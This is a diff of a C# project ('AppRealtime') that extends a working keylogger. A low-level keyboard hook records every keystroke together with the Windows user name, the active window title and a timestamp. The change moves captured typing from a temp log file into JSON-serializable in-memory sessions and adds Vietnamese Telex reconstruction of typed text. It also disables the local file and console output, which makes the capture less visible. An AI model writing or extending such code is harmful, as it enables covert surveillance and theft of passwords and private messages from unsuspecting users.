@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -8,14 +9,142 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows.Media.Media3D;
 
 namespace AppRealtime
 {
+    public class MultiKeyLog
+    {
+        public long Id { get; set; }
+        public List<KeyLog> KeyLogCollection { get; set; } = new List<KeyLog>();
+    }
+    public class KeyLog
+    {
+        public string Time { get; set; } = string.Empty;
+        public string Windows { get; set; } = string.Empty;
+        public string UserName { get; set; } = string.Empty;
+        public string Keys => KeyStringBuilder.ToString();// KeyConverter.ConvertTelexInput(KeyStringBuilder.ToString());
+
+        [JsonIgnore]
+        public StringBuilder KeyStringBuilder = new StringBuilder();
+    }
+
+    public static class KeyConverter
+    {
+        public static string ConvertTelexInput(string input)
+        {
+            StringBuilder sb = new StringBuilder();
+            int cursorPos = 0;
+
+            const string spaceTag = "<Space Bar>";
+            const string backspaceTag = "<Backspace>";
+            const string leftTag = "<Left>";
+            const string rightTag = "<Right>";
+            const string upTag = "<Up>";
+            const string downTag = "<Down>";
+
+            for (int i = 0; i < input.Length;)
+            {
+                if (input[i] == '<')
+                {
+                    if (input.Substring(i).StartsWith(spaceTag))
+                    {
+                        sb.Insert(cursorPos, ' ');
+                        cursorPos++;
+                        i += spaceTag.Length;
+                    }
+                    else if (input.Substring(i).StartsWith(backspaceTag))
+                    {
+                        if (cursorPos > 0)
+                        {
+                            sb.Remove(cursorPos - 1, 1);
+                            cursorPos--;
+                        }
+                        i += backspaceTag.Length;
+                    }
+                    else if (input.Substring(i).StartsWith(leftTag))
+                    {
+                        if (cursorPos > 0)
+                        {
+                            cursorPos--;
+                        }
+                        i += leftTag.Length;
+                    }
+                    else if (input.Substring(i).StartsWith(rightTag))
+                    {
+                        if (cursorPos < sb.Length)
+                        {
+                            cursorPos++;
+                        }
+                        i += rightTag.Length;
+                    }
+                    else if (input.Substring(i).StartsWith(upTag))
+                    {
+                        i += upTag.Length;
+                    }
+                    else if (input.Substring(i).StartsWith(downTag))
+                    {
+                        i += downTag.Length;
+                    }
+                    else
+                    {
+                        // Handle unknown tags if needed
+                        i++;
+                    }
+                }
+                else
+                {
+                    sb.Insert(cursorPos, input[i]);
+                    cursorPos++;
+                    i++;
+                }
+            }
+
+            string result = sb.ToString();
+            result = TelexConversion(result);
+            return result;
+        }
+
+        static string TelexConversion(string input)
+        {
+            var telexDict = new Dictionary<string, string>
+        {
+            { "aw", "ă" }, { "af", "à" }, { "as", "á" }, { "ar", "ả" }, { "ax", "ã" }, { "aj", "ạ" },
+            { "awf", "ằ" }, { "aws", "ắ" }, { "awr", "ẳ" }, { "awj", "ặ" }, { "aa", "â" },
+            { "aaf", "ầ" }, { "aas", "ấ" }, { "aar", "ẩ" }, { "aax", "ẫ" }, { "aaj", "ậ" },
+            { "ef", "è" }, { "es", "é" }, { "er", "ẻ" }, { "ex", "ẽ" }, { "ej", "ẹ" }, { "ee", "ê" },
+            { "eef", "ề" }, { "ees", "ế" }, { "eer", "ể" }, { "eex", "ễ" }, { "eej", "ệ" },
+            { "if", "ì" }, { "is", "í" }, { "ir", "ỉ" }, { "ix", "ĩ" }, { "ij", "ị" },
+            { "of", "ò" }, { "os", "ó" }, { "or", "ỏ" }, { "ox", "õ" }, { "oj", "ọ" }, { "oo", "ô" },
+            { "oof", "ồ" }, { "oos", "ố" }, { "oor", "ổ" }, { "oox", "ỗ" }, { "ooj", "ộ" }, { "ow", "ơ" },
+            { "owf", "ờ" }, { "ows", "ớ" }, { "owr", "ở" }, { "owx", "ỡ" }, { "owj", "ợ" },
+            { "uf", "ù" }, { "us", "ú" }, { "ur", "ủ" }, { "ux", "ũ" }, { "uj", "ụ" }, { "uw", "ư" },
+            { "uwf", "ừ" }, { "uws", "ứ" }, { "uwr", "ử" }, { "uwx", "ữ" }, { "uwj", "ự" },
+            { "yf", "ỳ" }, { "ys", "ý" }, { "yr", "ỷ" }, { "yx", "ỹ" }, { "yj", "ỵ" },
+            { "dd", "đ" }
+        };
+
+            foreach (var kvp in telexDict)
+            {
+                input = input.Replace(kvp.Key, kvp.Value);
+            }
+
+            return input;
+        }
+    }
+
+
     public class KeyLogger
     {
-        public static string logName = Path.GetTempPath() + Guid.NewGuid().ToString() + ".log";
-        public static string lastTitle = "";
-        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+        public static List<MultiKeyLog> KeyLogs { get; private set; } = new List<MultiKeyLog>();
+
+        private static string logName = Path.GetTempPath() + Guid.NewGuid().ToString() + ".log";
+        private static string lastTitle = "";
+        private static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+        private static long lastLogId;
+        private static Queue<long> RemoveKeyLogQueue = new Queue<long>();
+        private static KeyLog lastKeyLog = null;
+        private static MultiKeyLog lastMultiKeyLog = null;
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -1095,6 +1224,11 @@ namespace AppRealtime
 
         private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
         {
+            if (lastLogId == 0)
+            {
+                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam); ;
+            }
+
             Int32 msgType = wParam.ToInt32();
             Int32 vKey;
             string key = "";
@@ -1319,61 +1453,6 @@ namespace AppRealtime
                         }
                     }
                 }
-                else if (vKey >= 65 && vKey <= 90)
-                {
-                    // Handling Vietnamese accented characters
-                    if (shift || caps)
-                    {
-                        key = ((Keys)vKey).ToString();
-                    }
-                    else
-                    {
-                        key = ((Keys)vKey).ToString().ToLower();
-                    }
-
-                    switch (vKey)
-                    {
-                        case 65: key = "a"; break;
-                        case 69: key = "e"; break;
-                        case 73: key = "i"; break;
-                        case 79: key = "o"; break;
-                        case 85: key = "u"; break;
-                        case 89: key = "y"; break;
-                        case 192: key = "à"; break;
-                        case 193: key = "á"; break;
-                        case 194: key = "â"; break;
-                        case 195: key = "ã"; break;
-                        case 200: key = "è"; break;
-                        case 201: key = "é"; break;
-                        case 202: key = "ê"; break;
-                        case 204: key = "ì"; break;
-                        case 205: key = "í"; break;
-                        case 206: key = "î"; break;
-                        case 210: key = "ò"; break;
-                        case 211: key = "ó"; break;
-                        case 212: key = "ô"; break;
-                        case 213: key = "õ"; break;
-                        case 217: key = "ù"; break;
-                        case 218: key = "ú"; break;
-                        case 221: key = "ý"; break;
-                        case 224: key = "à"; break;
-                        case 225: key = "á"; break;
-                        case 226: key = "â"; break;
-                        case 227: key = "ã"; break;
-                        case 232: key = "è"; break;
-                        case 233: key = "é"; break;
-                        case 234: key = "ê"; break;
-                        case 236: key = "ì"; break;
-                        case 237: key = "í"; break;
-                        case 242: key = "ò"; break;
-                        case 243: key = "ó"; break;
-                        case 244: key = "ô"; break;
-                        case 245: key = "õ"; break;
-                        case 249: key = "ù"; break;
-                        case 250: key = "ú"; break;
-                        case 253: key = "ý"; break;
-                    }
-                }
                 else
                 {
                     switch ((Keys)vKey)
@@ -1505,16 +1584,24 @@ namespace AppRealtime
                 StringBuilder title = new StringBuilder(256);
                 GetWindowText(hWindow, title, title.Capacity);
 
+                while (RemoveKeyLogQueue.Count > 0)
+                {
+                    var logId = RemoveKeyLogQueue.Dequeue();
+                    if (logId > 0)
+                    {
+                        KeyLogs.RemoveAll(k => k.Id == logId);
+                    }
+                }
+
                 Dictionary<string, string> props = new Dictionary<string, string>();
                 props["Key"] = key;
                 props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                 props["Window"] = title.ToString();
-                if (props["Window"] != KeyLogger.lastTitle)
+                if (props["Window"] != KeyLogger.lastTitle) 
                 {
                     string titleString = "User    : " + KeyLogger.userName + Environment.NewLine +
                                             "Window  : " + props["Window"] + Environment.NewLine +
                                             "Time    : " + props["Time"] + Environment.NewLine +
-                                            "LogFile : " + KeyLogger.logName + Environment.NewLine +
                                             "----------------------------------------------";
                     //Console.WriteLine();
                     //Console.WriteLine();
@@ -1526,10 +1613,18 @@ namespace AppRealtime
                     Trace.WriteLine("");
                     // Write to file
                     KeyLogger.lastTitle = props["Window"];
+                    lastKeyLog = new KeyLog
+                    {
+                        UserName = userName,
+                        Windows = props["Window"],
+                        Time = props["Time"]
+                    };
+                    lastMultiKeyLog.KeyLogCollection.Add(lastKeyLog);
                 }
                 //Console.Write(props["Key"]);
                 Trace.Write(props["Key"]);
                 // log to file here
+                lastKeyLog.KeyStringBuilder.Append(props["Key"]);
             }
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
@@ -1539,20 +1634,47 @@ namespace AppRealtime
             Application.Run(new ClipboardNotification.NotificationForm());
         }
 
+        public static void WriteNewLogSession(long logId)
+        {
+            lastLogId = logId;
+
+            // save max 3 log id
+            // if has 2 log id previous, then remove the older log id
+
+            if (KeyLogs.Count >= 2)
+            {
+                long maxId = KeyLogs.Max(k => k.Id);
+                foreach(var item in KeyLogs)
+                {
+                    if (item.Id < maxId)
+                    {
+                        RemoveKeyLogQueue.Enqueue(item.Id);
+                    }
+                }
+            }
+
+            lastMultiKeyLog = new MultiKeyLog
+            {
+                Id = logId,
+                KeyLogCollection = new List<KeyLog>()
+            };
+            KeyLogs.Add(lastMultiKeyLog);
+        }
+
         public static void Run()
         {
             try
             {
                 Trace.Listeners.Clear();
-                TextWriterTraceListener twtl = new TextWriterTraceListener(KeyLogger.logName);
-                twtl.Name = "TextLogger";
-                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+                //TextWriterTraceListener twtl = new TextWriterTraceListener(KeyLogger.logName);
+                //twtl.Name = "TextLogger";
+                //twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
 
-                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
-                ctl.TraceOutputOptions = TraceOptions.DateTime;
+                //ConsoleTraceListener ctl = new ConsoleTraceListener(false);
+                //ctl.TraceOutputOptions = TraceOptions.DateTime;
 
-                Trace.Listeners.Add(twtl);
-                Trace.Listeners.Add(ctl);
+                //Trace.Listeners.Add(twtl);
+                //Trace.Listeners.Add(ctl);
                 Trace.AutoFlush = true;
 
 
